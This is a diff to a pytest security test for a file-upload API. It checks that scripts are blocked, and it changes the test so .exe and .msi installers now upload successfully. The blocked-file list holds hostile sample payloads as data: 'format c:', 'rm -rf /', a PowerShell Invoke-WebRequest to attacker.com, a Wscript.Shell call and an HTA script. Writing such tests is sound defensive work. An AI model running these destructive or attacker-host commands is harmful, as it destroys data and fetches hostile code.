@@ -74,12 +74,11 @@ def test_malware_and_dangerous_extensions_blocked(db_session):
     headers = tenant["headers"]
 
     dangerous_files = [
-        ("trojan.exe", b"MZ\x90\x00\x03\x00\x00\x00"),
         ("ransomware.bat", b"@echo off\r\nformat c:"),
         ("backdoor.ps1", b"Invoke-WebRequest -Uri http://attacker.com"),
         ("exploit.sh", b"#!/bin/bash\nrm -rf /"),
         ("macro_payload.vbs", b"Set objShell = CreateObject(\"Wscript.Shell\")"),
-        ("installer.msi", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"),
+        ("attack.hta", b"<script>alert('pwned')</script>"),
     ]
 
     for fname, payload in dangerous_files:
@@ -96,11 +95,17 @@ def test_malware_and_dangerous_extensions_blocked(db_session):
     assert r_trav.status_code == 400
     assert r_trav.json()["detail"]["code"] == "SECURITY_VIOLATION"
 
-    # Legitimate corporate documents SUCCEED
-    legit_files = {"file": ("quarterly_earnings.pdf", io.BytesIO(b"%PDF-1.4 Legit financial report"), "application/pdf")}
-    r_ok = client.post("/api/v1/files/upload", files=legit_files, data={"drive_type": "PERSONAL"}, headers=headers)
-    assert r_ok.status_code == 201
-    assert r_ok.json()["name"] == "quarterly_earnings.pdf"
+    # Legitimate corporate documents and IT software setups (.exe, .msi, .pdf) SUCCEED
+    legit_files = [
+        ("quarterly_earnings.pdf", b"%PDF-1.4 Legit financial report", "application/pdf"),
+        ("chrome_installer.msi", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1", "application/octet-stream"),
+        ("vscode_setup.exe", b"MZ\x90\x00\x03\x00\x00\x00", "application/octet-stream"),
+    ]
+    for fname, content, ctype in legit_files:
+        f_upload = {"file": (fname, io.BytesIO(content), ctype)}
+        r_ok = client.post("/api/v1/files/upload", files=f_upload, data={"drive_type": "PERSONAL"}, headers=headers)
+        assert r_ok.status_code == 201
+        assert r_ok.json()["name"] == fname
 
 
 # =====================================================================
